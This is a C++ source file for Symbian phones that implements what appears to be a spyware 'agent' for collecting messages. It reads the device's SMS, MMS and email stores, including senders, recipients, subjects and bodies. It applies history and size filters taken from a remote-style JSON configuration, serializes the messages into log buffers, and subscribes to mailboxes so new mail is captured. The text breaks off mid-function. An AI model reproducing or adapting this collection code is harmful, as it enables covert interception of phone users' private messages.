/*
 ============================================================================
 Name		: AgentMessages3.cpp
 Author	  : 
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentMessages implementation
 ============================================================================
 */

#include "AgentMessages3.h"
#include <mmsconst.h>
#include <POPCMTM.H> 
#include <smut.h>
#include <msvapi.h>                     // CMsvSession
#include <mtclreg.h>                    // CClientMtmRegistry
#include <S32MEM.H>
#include <smuthdr.h>
#include <MMsvAttachmentManager.h>		// MMS attachments
#include <smsclnt.h>
#include <UTF.H>						// utf-unicode conversion
#include <CMsvMimeHeaders.h>
#include <f32file.h>					// RFs
#include <charconv.h>

#include <HT\TimeUtils.h>


_LIT(KClassSms,"IPM.SMSText*");
_LIT(KClassMail,"IPM.Note*");
_LIT(KClassMms,"IPM.MMS*");
_LIT(KUs, "Local");
_LIT(KNullDate, "0000-00-00 00:00:00");

enum TObjectType {
		EStringFolder           = 0x01000000,
		EStringClass            = 0x02000000,
		EStringFrom             = 0x03000000,
		EStringTo               = 0x04000000,
		EStringCc				= 0x05000000,
		EStringBcc              = 0x06000000,
		EStringSubject          = 0x07000000,

		EHeaderMapiV1           = 0x20000000,

		EObjectMIMEBody         = 0x80000000,
		EObjectTextBody			= 0x84000000,
		EObjectAttach           = 0x81000000,
		EObjectDeliveryTime     = 0x82000000,

		EExtended               = 0xFF000000, 		
	};


enum TMessageType
	{
	EUnknown = 0, ESMS, EMMS, ESMTP, EPOP3, EIMAP4
	};



CAgentMessages3::CAgentMessages3() :
	CAbstractAgent(EAgent_Messages), iMailDump(EFalse)
	{
	// No implementation required
	}

CAgentMessages3::~CAgentMessages3()
	{
	__FLOG(_L("Destructor"));
	
	for ( TInt i = 0; i < iMailboxes.Count(); i++ )
		{
		MEmailMailbox* mailbox = iMailboxes[i];
		mailbox->UnregisterObserver(*this);  
		mailbox->Release();   
		}
	iMailboxes.Close();
	iMailClient->Release();
	iMailClient = NULL;
	delete iFactory;
	iFactory = NULL;
		
	delete iLongTask;
	delete iFilter;
	delete iSelection;
	delete iSmsMtm;
	delete iMmsMtm;
	delete iMtmReg;   
	delete iMsvSession;
	iMsvArray.Close();
				
	delete iSmsCollectFilter; 
    delete iSmsRuntimeFilter;
    delete iMmsCollectFilter;
	delete iMmsRuntimeFilter;
    delete iMailCollectFilter;
    delete iMailRuntimeFilter;
    
    delete iMarkupFile;
		
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentMessages3* CAgentMessages3::NewLC(const TDesC8& params)
	{
	CAgentMessages3* self = new (ELeave) CAgentMessages3();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentMessages3* CAgentMessages3::NewL(const TDesC8& params)
	{
	CAgentMessages3* self = CAgentMessages3::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}


void CAgentMessages3::FillFilter(CMessageFilter* aFilter, const TAgentClassFilter aFilterHeader)
	{
	aFilter->iLog = aFilterHeader.iEnabled;
	if(aFilter->iLog)
		{
		aFilter->iSinceFilter = aFilterHeader.iDoFilterFromDate;
		aFilter->iUntilFilter = aFilterHeader.iDoFilterToDate;
		if (aFilter->iSinceFilter)
			{
			if(aFilterHeader.iHistory) 
				{
				//collect data starting from datefrom
				aFilter->SetStartDate(aFilterHeader.iFromDate);
				}
			else
				{
				//do not collect data
				TTime now;
				now.UniversalTime();
				aFilter->SetStartDate(now);
				}
			}
		if (aFilter->iUntilFilter) 
			{
			aFilter->SetEndDate(aFilterHeader.iToDate);
			}
		//message size, meaningful only for email messages
		aFilter->iMaxMessageBytesToLog = aFilterHeader.iMaxSize;  
		aFilter->iMaxMessageSize = aFilterHeader.iMaxSize;  
		}
	}

void CAgentMessages3::GetFilterData(TAgentClassFilter& aFilter, const CJsonObject* aJsonObject)
	{
	if(aJsonObject->Find(_L("enabled")) != KErrNotFound)
		aJsonObject->GetBoolL(_L("enabled"),aFilter.iEnabled);
	if(aFilter.iEnabled)
		{
		CJsonObject* filterObject;
		aJsonObject->GetObjectL(_L("filter"),filterObject);
		//check history
		if(filterObject->Find(_L("history")) != KErrNotFound)
			filterObject->GetBoolL(_L("history"),aFilter.iHistory);
		// get date from
		TBuf<24> dateFrom;
		filterObject->GetStringL(_L("datefrom"),dateFrom);
		aFilter.iDoFilterFromDate = ETrue;
		aFilter.iFromDate = TimeUtils::GetSymbianDate(dateFrom);
		// get date to
		if(filterObject->Find(_L("dateto")) != KErrNotFound)
			{
			TBuf<24> dateTo;
			filterObject->GetStringL(_L("dateto"),dateTo);
			// check null date "0000-00-00 00:00:00"
			if(dateTo.Compare(KNullDate) == 0)
				{
				aFilter.iDoFilterToDate = EFalse;
				}
			else
				{
				aFilter.iDoFilterToDate = ETrue;
				aFilter.iToDate = TimeUtils::GetSymbianDate(dateTo);
				}
			}
		// get max size
		if(filterObject->Find(_L("maxsize")) != KErrNotFound)
			filterObject->GetIntL(_L("maxsize"),aFilter.iMaxSize);
		}
	}

void CAgentMessages3::ParseParameters(const TDesC8& aParams)
	{
	
	RBuf paramsBuf;
			
	TInt err = paramsBuf.Create(2*aParams.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(aParams);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
    CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
    CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		TAgentClassFilter smsFilter;
		TAgentClassFilter mmsFilter;
		TAgentClassFilter mailFilter;
		CleanupStack::PushL(rootObject);
		//get sms data
		if(rootObject->Find(_L("sms")) != KErrNotFound)
			{
			CJsonObject* smsObject;
			rootObject->GetObjectL(_L("sms"),smsObject);
			GetFilterData(smsFilter,smsObject);
			}
		FillFilter(iSmsRuntimeFilter,smsFilter);
		FillFilter(iSmsCollectFilter,smsFilter);
		//get mms data
		if(rootObject->Find(_L("mms")) != KErrNotFound)
			{
			CJsonObject* mmsObject;
			rootObject->GetObjectL(_L("mms"),mmsObject);
			GetFilterData(mmsFilter,mmsObject);
			}
		FillFilter(iMmsRuntimeFilter,mmsFilter);
		FillFilter(iMmsCollectFilter,mmsFilter);
		//get mail data
		if(rootObject->Find(_L("mail")) != KErrNotFound)
			{
			CJsonObject* mailObject;
			rootObject->GetObjectL(_L("mail"),mailObject);
			GetFilterData(mailFilter,mailObject);
			}
		FillFilter(iMailRuntimeFilter,mailFilter);
		FillFilter(iMailCollectFilter,mailFilter);
					
		CleanupStack::PopAndDestroy(rootObject);
		}
	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
}

void CAgentMessages3::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_Messages.txt");
	__FLOG(_L("-------------"));
	
	iLastSavedMail.Set(_L("16010000:000000"));
				
	iMmsCollectFilter = CMessageFilter::NewL(); 
	iMmsRuntimeFilter = CMessageFilter::NewL();
	iSmsCollectFilter = CMessageFilter::NewL(); 
	iSmsRuntimeFilter = CMessageFilter::NewL();
	iMailCollectFilter = CMessageFilter::NewL(); 
	iMailRuntimeFilter = CMessageFilter::NewL();
		
	ParseParameters(params);
	
	iLongTask = CLongTaskAO::NewL(*this);
	iMsvSession = CMsvSession::OpenSyncL(*this); // open the session with the synchronous primitive
	iFilter = CMsvEntryFilter::NewL();
	iSelection = new (ELeave) CMsvEntrySelection();
	
	iMtmReg = CClientMtmRegistry::NewL(*iMsvSession);  
	iMmsMtm = static_cast<CMmsClientMtm*>(iMtmReg->NewMtmL(KUidMsgTypeMultimedia));
	iSmsMtm = static_cast<CSmsClientMtm*>(iMtmReg->NewMtmL(KUidMsgTypeSMS));
		
	iMarkupFile = CLogFile::NewL(iFs);
	
	iFactory = CEmailInterfaceFactory::NewL();
	iMailClient = static_cast<MEmailClientApi*>(iFactory->InterfaceL( KEmailClientApiInterface ) );
		
	}

void CAgentMessages3::PopulateArrayWithChildsTMsvIdEntriesL(TMsvId parentId)
	{
	iSelection->Reset();
	iMsvSession->GetChildIdsL(parentId, *iFilter, *iSelection);
	for (int i = 0; i < iSelection->Count(); i++)
		{
		TMsvId msvId = iSelection->At(i);
		iMsvArray.Append(msvId);
		}
	}

void CAgentMessages3::StartAgentCmdL()
	{
	// There is a file log for every message, so we don't open a file log here
	__FLOG(_L("START AGENT CMD"));
	
	iStopLongTask = EFalse; 
	
	// reset sms/mms store dump
	iMsvArray.Reset();
	iArrayIndex = 0;
	iMsvArray.Append(KMsvRootIndexEntryId);  
	// reset mail dump
	iMailDump = EFalse;
	if(iMailClient)
		{
		iMailboxesCounter = iMailClient->GetMailboxesL(iMailboxes);// Get the mailboxes and return mailboxes.Count(); xref: /app/commonemail/emailservices/emailclientapi/src/emailclientapiimpl.cpp
		}
	// if markup exists, look at history range
	iMarkup.smsFrom = iSmsCollectFilter->StartDate();
	iMarkup.smsTo = iSmsCollectFilter->EndDate();
	iMarkup.mmsFrom = iMmsCollectFilter->StartDate();
	iMarkup.mmsTo = iMmsCollectFilter->EndDate();
	iMarkup.mailFrom = iMailCollectFilter->StartDate();
	iMarkup.mailTo = iMailCollectFilter->EndDate();
	if(iMarkupFile->ExistsMarkupL(Type()))
		{
		// retrieve markup
		TMarkup markup;
		RBuf8 markupBuffer(iMarkupFile->ReadMarkupL(Type()));
		markupBuffer.CleanupClosePushL();
		Mem::Copy(&markup,markupBuffer.Ptr(),sizeof(markup));
		// compare with conf values
		if((markup.smsFrom == iSmsCollectFilter->StartDate()) && (markup.smsTo == iSmsCollectFilter->EndDate()))
			{
			iSmsCollectFilter->iLog = EFalse;
			}
		if((markup.mmsFrom == iMmsCollectFilter->StartDate()) && (markup.mmsTo == iMmsCollectFilter->EndDate()))
			{
			iMmsCollectFilter->iLog = EFalse;
			}
		if((markup.mailFrom == iMailCollectFilter->StartDate()) && (markup.mailTo == iMailCollectFilter->EndDate()))
			{
			iMailCollectFilter->iLog = EFalse;
			}
		CleanupStack::PopAndDestroy(&markupBuffer);	
		} 
	
	iLogNewMessages = ETrue;
	iLongTask->NextRound();
	}

void CAgentMessages3::StopAgentCmdL()
	{
	__FLOG(_L("STOP AGENT CMD"));
	iLogNewMessages = EFalse;
	iStopLongTask = ETrue;
	
	for ( TInt i = 0; i < iMailboxes.Count(); i++ )
		{
		MEmailMailbox* mailbox = iMailboxes[i];
		mailbox->UnregisterObserver(*this);  
		mailbox->Release();   
		}
	iMailboxes.Close();
	}

void CAgentMessages3::CycleAgentCmdL()
	{
	//nothing to be done, this is not an appending agent
	}

HBufC8* CAgentMessages3::GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId)
{

	TMAPISerializedMessageHeader serializedMsg;
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
		
	// set attachment number
	serializedMsg.iNumAttachs = 0;
			
	// set date in filetime format
	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
	serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
	serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
			
	// insert folder name
	TMsvId service;
	TMsvId parentMsvId = aMsvEntryIdx.Parent();
	TMsvEntry parentEntry;
	TInt res = iMsvSession->GetEntry(parentMsvId, service, parentEntry);
	if (res!=KErrNone)
		{
			CleanupStack::PopAndDestroy(buffer);
			return HBufC8::New(0);
		}
	TUint8* ptrData = (TUint8 *)parentEntry.iDetails.Ptr();
	TUint32 typeAndLen = EStringFolder;
	typeAndLen += parentEntry.iDetails.Size();
	buffer->InsertL(buffer->Size(), &typeAndLen,sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, parentEntry.iDetails.Size());
		
	// insert class
	typeAndLen = EStringClass;
	typeAndLen += KClassSms().Size(); 
	buffer->InsertL(buffer->Size(),&typeAndLen,sizeof(typeAndLen));
	ptrData = (TUint8 *)KClassSms().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, KClassSms().Size());
	
	
	iSmsMtm->SwitchCurrentEntryL(aMsvId);
	iSmsMtm->LoadMessageL();
	// insert recipients:
	const MDesC16Array &array = iSmsMtm->AddresseeList().RecipientList();
	TInt count = array.MdcaCount();
	if(count == 0) //Symbian3 devices have To: empty when incoming messages
		{
		serializedMsg.iFlags = MESSAGE_INCOMING;
		}
	CBufBase* buf = CBufFlat::NewL(50);
	CleanupStack::PushL(buf);
	_LIT(KVirgola,",");
	for(TInt i = 0; i<count; i++)
		{
		// if the number is in the addressbook, we need to delete associated name from address
		TBuf<124> tmp;
		tmp.Copy(array.MdcaPoint(i));
		TInt pos = tmp.Find(_L("<"));
		if(pos != KErrNotFound)
			{
			tmp.Copy(tmp.Mid(pos+1));
			pos = tmp.Find(_L(">"));
			if(pos!=KErrNotFound)
				{
				tmp.Copy(tmp.Left(pos));
				}
			}
		typeAndLen += tmp.Size();
		ptrData = (TUint8 *)tmp.Ptr();
		//ptrData = (TUint8 *)array.MdcaPoint(i).Ptr();
		//buf->InsertL(buf->Size(),ptrData,array.MdcaPoint(i).Size() );
		buf->InsertL(buf->Size(),ptrData,tmp.Size() );
		if(i < (count-1))
			buf->InsertL(buf->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
										
		}
	typeAndLen = EStringTo;
	typeAndLen += buf->Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), buf->Ptr(0), buf->Size());
	CleanupStack::PopAndDestroy(buf);																					
	// insert sender
	// if this is an outgoing sms, from and to have the same phone number, so we have to put NULL into from
	typeAndLen = EStringFrom;
	if((serializedMsg.iFlags & MESSAGE_INCOMING))
		{
		//incoming
		// if the number is in the addressbook, we need to delete associated name from address
		TBuf<124> tmp;
		tmp.Copy(iSmsMtm->SmsHeader().FromAddress());
		TInt pos = tmp.Find(_L("<"));
		if(pos != KErrNotFound)
			{
			tmp.Copy(tmp.Mid(pos+1));
			pos = tmp.Find(_L(">"));
			if(pos!=KErrNotFound)
				{
				tmp.Copy(tmp.Left(pos));
				}
			}
		typeAndLen += tmp.Size();
		ptrData = (TUint8 *)tmp.Ptr();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), ptrData, tmp.Size());
		}
	else
		{
		//outgoing
		ptrData = (TUint8 *)iSmsMtm->SmsHeader().FromAddress().Ptr();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), ptrData, 0);
		}
	// insert body
	// this code retrieves body larger than 256 characters:
	// http://discussion.forum.nokia.com/forum/showthread.php?146721-how-to-get-FULL-message-body-for-SMS/page2&highlight=mime+body
	CMsvEntry* cEntry = iMsvSession->GetEntryL(aMsvId);
	CleanupStack::PushL(cEntry);
	if (cEntry->HasStoreL())
		{
		CMsvStore *store = cEntry->ReadStoreL();
		CleanupStack::PushL(store);
			
		if (store->HasBodyTextL())
			{
			TInt length = iSmsMtm->Body().DocumentLength();
			
			HBufC* bodyBuf = HBufC::NewLC(length);
			
			TPtr ptr(bodyBuf->Des());
			iSmsMtm->Body().Extract(ptr,0,length);	
			typeAndLen = EStringSubject;
			typeAndLen += ptr.Size();
			buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
			ptrData = (TUint8 *)bodyBuf->Des().Ptr();
			buffer->InsertL(buffer->Size(), ptrData, bodyBuf->Des().Size());
			
			CleanupStack::PopAndDestroy(bodyBuf);
			
			}
		CleanupStack::PopAndDestroy(store);
		}
	CleanupStack::PopAndDestroy(cEntry);
	
	serializedMsg.iDwSize += buffer->Size();
	// insert the log structure 
	buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg)); 
		
	HBufC8* result = buffer->Ptr(0).AllocL();
		
	CleanupStack::PopAndDestroy(buffer);
	
	return result;
}
	

HBufC8* CAgentMessages3::GetMMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId)
	{

	TMAPISerializedMessageHeader serializedMsg;
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	// TODO:remember to set real attachment number, see below in the body retrieval part
	serializedMsg.iNumAttachs = 0;
				
	// set date in filetime format
	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
	serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
	serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
					
	// insert folder name
	TMsvId service;
	TMsvId parentMsvId = aMsvEntryIdx.Parent();
	TMsvEntry parentEntry;
	TInt res = iMsvSession->GetEntry(parentMsvId, service, parentEntry);
	if (res!=KErrNone)
		{
		CleanupStack::PopAndDestroy(buffer);
		return HBufC8::New(0);
		}
	TUint8* ptrData = (TUint8 *)parentEntry.iDetails.Ptr();
	TUint32 typeAndLen = EStringFolder;
	typeAndLen += parentEntry.iDetails.Size();
	buffer->InsertL(buffer->Size(), &typeAndLen,sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, parentEntry.iDetails.Size());
			
	// insert class
	typeAndLen = EStringClass;
	typeAndLen += KClassMms().Size(); 
	buffer->InsertL(buffer->Size(),&typeAndLen,sizeof(typeAndLen));
	ptrData = (TUint8 *)KClassMms().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, KClassMms().Size());
		
	// insert body
	CMsvEntry* entry = iMsvSession->GetEntryL(aMsvId); 	
	CleanupStack::PushL(entry);
	CMsvStore* store = entry->ReadStoreL(); 	
	if(store!= NULL) 	
	    { 		
	    CleanupStack::PushL(store); 		
	    MMsvAttachmentManager& attManager = store->AttachmentManagerL(); 		

		// TODO:set attachment number while working with attachment  manager 
		//serializedMsg.iNumAttachs = attManager.AttachmentCount();
	
	    _LIT8(KMimeBuf, "text/plain"); 			         
	    TBuf8<10>mimeBuf(KMimeBuf);
				
	    // Cycle through the attachments
	    for(TInt i=0; i<attManager.AttachmentCount(); i++) 			
	        { 			
	        CMsvAttachment* attachment = attManager.GetAttachmentInfoL(i); 			
	        CleanupStack::PushL(attachment); 			
			
	        // Test to see if we have a text file
	        if(mimeBuf.CompareF(attachment->MimeType())== 0) 				
	            {
				RFile file = attManager.GetAttachmentFileL(i);
	        	            
	        	// The file can then be read using the normal file functionality
	        	// After reading, the file should be closed
	        	TInt fileSize = 0;
	        	User::LeaveIfError(file.Size(fileSize));
	        	            
	        	HBufC8* fileBuf8 = HBufC8::NewLC(fileSize);
	        	TPtr8 bufPtr = fileBuf8->Des();
	        	User::LeaveIfError(file.Read(bufPtr, fileSize));
	        	file.Close();
	        	
				
	        	/*
	        	// correspondances TUint-charset are IANA MIBenum:
	        	// http://www.iana.org/assignments/character-sets
	        	// this code isn't working: 
	        	// - CMsvMimeHeaders::MimeCharset provides you the assigned number from IANA
				// - CCnvCharacterSetConverter::PrepareToConvertToOrFromL expects the UID of a converter implementation - from charconv.h (like KCharacterSetIdentifierUtf8=0x1000582d, for UTF8) 
	        	// but this mechanism could be used to provide specific decoding scheme for specific character sets....
	        	// at this moment i only provide for UTF-8 in the part  of code not commented 
				CMsvMimeHeaders* mimeHeaders = CMsvMimeHeaders::NewLC();
				mimeHeaders->RestoreL(*attachment);
				TUint charset = 0;
				charset	= mimeHeaders->MimeCharset();
				CleanupStack::PopAndDestroy(mimeHeaders);
	        
				// Set up file server session
				RFs fileServerSession;
				fileServerSession.Connect();
				CCnvCharacterSetConverter* CSConverter = CCnvCharacterSetConverter::NewLC();
				if (CSConverter->PrepareToConvertToOrFromL(charset,fileServerSession) != 
				            CCnvCharacterSetConverter::EAvailable)
				{
					//CSConverter->PrepareToConvertToOrFromL(charset,fileServerSession);
					User::Leave(KErrNotSupported);
				}
				// Create a buffer for the unconverted text - initialised with the input descriptor
				TPtrC8 remainderOfForeignText(fileBuf8->Des());
				// Create a "state" variable and initialise it with CCnvCharacterSetConverter::KStateDefault
				// After initialisation the state variable must not be tampered with.
				// Simply pass into each subsequent call of ConvertToUnicode()
				TInt state=CCnvCharacterSetConverter::KStateDefault;
				
				HBufC* unicodeText = HBufC::NewLC(fileSize*2);
				TPtr unicodeTextPtr = unicodeText->Des();
				for(;;)  // conversion loop
				{
					const TInt returnValue = CSConverter->ConvertToUnicode(unicodeTextPtr,remainderOfForeignText,state);
				    if (returnValue <= 0) // < error
				    {
				       break;
				    }
				    remainderOfForeignText.Set(remainderOfForeignText.Right(returnValue));
				}
				
				typeAndLen = EStringSubject;
				typeAndLen += unicodeText->Size();
				buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
				ptrData = (TUint8 *)unicodeText->Ptr();
				buffer->InsertL(buffer->Size(), ptrData, unicodeText->Size());
					            
				
				CleanupStack::PopAndDestroy(unicodeText);

				CleanupStack::PopAndDestroy(CSConverter);
				fileServerSession.Close();

				*/
	        	
	        	CMsvMimeHeaders* mimeHeaders = CMsvMimeHeaders::NewLC();
	        	mimeHeaders->RestoreL(*attachment);
	        	TUint charset = mimeHeaders->MimeCharset();
	        	CleanupStack::PopAndDestroy(mimeHeaders);  
	        		        	
	        	if(charset == 0x6a)   // 0x6a = UTF-8  // other charsets can be added below with if statements
	        	{	
					
					RBuf unicodeBuf(CnvUtfConverter::ConvertToUnicodeFromUtf8L(bufPtr));
					unicodeBuf.CleanupClosePushL();
					typeAndLen = EObjectTextBody;   
					typeAndLen += unicodeBuf.Size();
					buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
					ptrData = (TUint8 *)unicodeBuf.Ptr();
					buffer->InsertL(buffer->Size(), ptrData, unicodeBuf.Size());
					CleanupStack::PopAndDestroy(&unicodeBuf);
					            	
	        	}
	        	CleanupStack::PopAndDestroy(fileBuf8);
	        		        	
	            }
	        CleanupStack::PopAndDestroy(attachment);
	        }
	    CleanupStack::PopAndDestroy(store);
	    }  
	CleanupStack::PopAndDestroy(entry);
	
	iMmsMtm->SwitchCurrentEntryL(aMsvId);
	iMmsMtm->LoadMessageL();
	
	// insert subject	
	typeAndLen = EStringSubject;
	typeAndLen += iMmsMtm->SubjectL().Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	ptrData = (TUint8 *)iMmsMtm->SubjectL().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, iMmsMtm->SubjectL().Size());
	
	// insert recipients:
	const MDesC16Array &array = iMmsMtm->AddresseeList().RecipientList();
	TInt count = array.MdcaCount();
	if(count == 0) //Symbian3 devices have To: empty when incoming messages
		{
		serializedMsg.iFlags = MESSAGE_INCOMING;
		}
	CBufBase* buf = CBufFlat::NewL(50);
	CleanupStack::PushL(buf);
	_LIT(KVirgola,",");
	for(TInt i = 0; i<count; i++)
		{
		ptrData = (TUint8 *)array.MdcaPoint(i).Ptr();
		buf->InsertL(buf->Size(),ptrData,array.MdcaPoint(i).Size() );
		if(i < (count-1))
			buf->InsertL(buf->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
									
		}
	typeAndLen = EStringTo;
	typeAndLen += buf->Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), buf->Ptr(0), buf->Size());
	CleanupStack::PopAndDestroy(buf);																					
	// insert sender 
	// if this is an outgoing mms, from and to have the same phone number, so we have to put NULL into from
	typeAndLen = EStringFrom;
	if((serializedMsg.iFlags & MESSAGE_INCOMING))
		{
		typeAndLen += iMmsMtm->Sender().Size();
		ptrData = (TUint8 *)iMmsMtm->Sender().Ptr();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), ptrData, iMmsMtm->Sender().Size());
		}
	else
		{
		//typeAndLen += iMmsMtm->Sender().Size();
		ptrData = (TUint8 *)iMmsMtm->Sender().Ptr();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), ptrData, 0);
		}
	serializedMsg.iDwSize += buffer->Size();
	
	// insert the log structure 
	buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg));
	HBufC8* result = buffer->Ptr(0).AllocL();
		
	CleanupStack::PopAndDestroy(buffer);

	return result;
	}

HBufC8* CAgentMessages3::GetMailBufferL(MEmailMessage* aMsg, CMessageFilter* aFilter)
	{
	CBufBase* mailBuffer = CBufFlat::NewL(50);
	CleanupStack::PushL(mailBuffer);
		
	// set date in filetime format
	TInt64 date = TimeUtils::GetFiletime(aMsg->Date());
	iMailRawAdditionalData.highDateTime = (date >> 32);
	iMailRawAdditionalData.lowDateTime = (date & 0xFFFFFFFF);
	
	TUint8* ptrData;
		
	// TODO: find the real MessageId:
	_LIT8(KMsgId,"Message-ID: <50603B28.6060304@fake.addr>");
	ptrData = (TUint8 *)KMsgId().Ptr();
	mailBuffer->InsertL(mailBuffer->Size(), ptrData, KMsgId().Size());
	// insert sender
	_LIT8(KFrom,"\r\nFrom: ");
	ptrData = (TUint8 *)KFrom().Ptr();
	mailBuffer->InsertL(mailBuffer->Size(), ptrData, KFrom().Size());
	MEmailAddress* senderAddr;
	senderAddr = aMsg->SenderAddressL();
	RBuf8 from8;
	from8.Create(senderAddr->Address().Size());
	from8.CleanupClosePushL();
	from8.Copy(senderAddr->Address());
	ptrData = (TUint8 *)from8.Ptr();
	mailBuffer->InsertL(mailBuffer->Size(),ptrData, from8.Size());
	CleanupStack::PopAndDestroy(&from8);
	// insert Date:
	_LIT8(KDate,"\r\nDate: ");
	ptrData = (TUint8 *)KDate().Ptr();
	mailBuffer->InsertL(mailBuffer->Size(), ptrData, KDate().Size());
	TTime mailDate = aMsg->Date();
	TBuf<50> dateString;
	_LIT(KDateString,"%F %E, %D %N %Y %H:%T:%S");
	mailDate.FormatL(dateString,KDateString);
	TBuf8<100> dateString8;
	dateString8.Copy(dateString);
	// Thu, 13 May 2010 04:11
	ptrData = (TUint8 *)dateString8.Ptr();
	mailBuffer->InsertL(mailBuffer->Size(),ptrData,dateString8.Size());
	// insert subject
	_LIT8(KSubject, "\r\nSubject: ");
	ptrData = (TUint8 *)KSubject().Ptr();
	mailBuffer->InsertL(mailBuffer->Size(), ptrData, KSubject().Size());
	RBuf8 subject8;
	subject8.Create(aMsg->Subject().Size());
	subject8.CleanupClosePushL();
	subject8.Copy(aMsg->Subject());
	ptrData = (TUint8 *)subject8.Ptr();
	mailBuffer->InsertL(mailBuffer->Size(),ptrData, subject8.Size());
	CleanupStack::PopAndDestroy(&subject8);
	// insert to
	REmailAddressArray recipients;
	CleanupResetAndRelease<MEmailAddress>::PushL(recipients);
	TInt countRec = aMsg->GetRecipientsL(MEmailAddress::EUndefined,recipients); // ETo,ECc,EBcc;EUndefined - returns to,cc and bcc recipients in that order
	CBufBase* bufTo8 = CBufFlat::NewL(50);  
	CleanupStack::PushL(bufTo8);
	_LIT8(KVirgola,",");
	for(TInt i = 0; i< countRec ; i++)
		{
			MEmailAddress* address = recipients[i];
			RBuf8 address8;
			address8.Create(address->Address().Size());
			address8.CleanupClosePushL();
			address8.Copy(address->Address());
			ptrData = (TUint8 *)address8.Ptr();
			bufTo8->InsertL(bufTo8->Size(),ptrData,address8.Size());
			if(i < (countRec-1))
			{
				bufTo8->InsertL(bufTo8->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
			}
			CleanupStack::PopAndDestroy(&address8);
		}
	_LIT8(KTo,"\r\nTo: ");
	ptrData = (TUint8 *)KTo().Ptr();
	mailBuffer->InsertL(mailBuffer->Size(), ptrData, KTo().Size());
	mailBuffer->InsertL(mailBuffer->Size(), bufTo8->Ptr(0), bufTo8->Size());
	CleanupStack::PopAndDestroy(bufTo8);
	
	CleanupStack::PopAndDestroy(&recipients);
	recipients.Close();
		
	// insert body
	// insert MIME header
	// ISO-10646-UCS-2
	_LIT8(KMimeHeader,"\r\nMIME-Version: 1.0\r\nContentType: text/plain; charset=UTF8\r\n\r\n");
	//_LIT8(KMimeHeader,"\r\nMIME-Version: 1.0\r\nContentType: text/plain\r\n\r\n");
	ptrData = (TUint8 *)KMimeHeader().Ptr();
	mailBuffer->InsertL(mailBuffer->Size(), ptrData, KMimeHeader().Size());
	MEmailMessageContent* content;
	TRAPD(contentErr,content = aMsg->ContentL());
	if(contentErr == KErrNone)
		{
		if(content)
			{
			RBuf data;
			RetrieveTotalBodyL(content, data);
			ptrData = (TUint8 *)data.Ptr();
			if(data.Size() <= aFilter->iMaxMessageSize)
				mailBuffer->InsertL(mailBuffer->Size(), ptrData, data.Size());
			else
				mailBuffer->InsertL(mailBuffer->Size(), ptrData, aFilter->iMaxMessageSize);
			data.Close();
			}
		}
		
	// TODO: only for test delete when finished
	//WriteMailFile(mailBuffer->Ptr(0));
			
	HBufC8* result = mailBuffer->Ptr(0).AllocL();
	
	iMailRawAdditionalData.uSize = mailBuffer->Size();
	
	CleanupStack::PopAndDestroy(mailBuffer);
	
	return result;
	}

void CAgentMessages3::DoOneRoundL()
	{
	__FLOG(_L("DoOneRoundL"));
	// If the Agent has been stopped, don't proceed on the next round...
	if (iStopLongTask)
		return;

	if(iMailDump)
		{
		if(!iMailCollectFilter->iLog)
			{
			// we are not interested in collecting
			// write markup
			RBuf8 buf(GetMarkupBufferL(iMarkup));
			buf.CleanupClosePushL();
			if (buf.Length() > 0)
				{
				iMarkupFile->WriteMarkupL(Type(),buf);
				}
			CleanupStack::PopAndDestroy(&buf);
			// subscribe to notifications if mail enabled
			if(iMailRuntimeFilter->iLog)
				{
				for(TInt i=0; i < iMailboxes.Count(); i++)
					{
					MEmailMailbox* mailbox = iMailboxes[i];
					mailbox->RegisterObserverL(*this);
					}
